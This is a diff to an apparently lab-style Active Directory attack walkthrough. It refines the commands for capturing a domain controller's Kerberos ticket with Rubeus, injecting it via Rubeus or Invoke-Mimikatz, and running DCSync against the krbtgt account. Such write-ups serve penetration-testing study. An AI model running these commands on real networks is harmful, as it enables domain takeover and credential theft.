@@ -118,7 +118,7 @@ Let's use **MS-RPRN.exe** (https://github.com/leechristensen/SpoolSample) on `us
 We can capture the TGT of `us-dc$` by using `Rubeus` (https://github.com/GhostPack/Rubeus) on `us-web`:
 
 ```
-.\Rubeus.exe monitor /interval:5
+.\Rubeus.exe monitor /target:US-DC$ /interval:5 /nowrap
 ```
 
 <br/>
@@ -126,13 +126,13 @@ We can capture the TGT of `us-dc$` by using `Rubeus` (https://github.com/GhostPa
 Copy the base64 encoded TGT, remove extra spaces and use it on the attacker' machine:
 
 ```
-.\Rubeus.exe ptt /ticket:<>
+.\Rubeus.exe ptt /ticket:<base64-string>
 ```
 
 Or you can use `Invoke-Mimikatz`:
 
 ```
-[IO.File]::WriteAllBytes("C:\AD\Tools\USDC.kirbi", [Convert]::FromBase64String("ticket_from_Rubeus_monitor"))
+[IO.File]::WriteAllBytes("C:\AD\Tools\USDC.kirbi", [Convert]::FromBase64String("<base64_string_from_Rubeus_monitor>"))
 
 Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\USDC.kirbi"'
 ```
@@ -144,4 +144,6 @@ Then run DCSync:
 ```
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
 ```
+
+<br/>
 
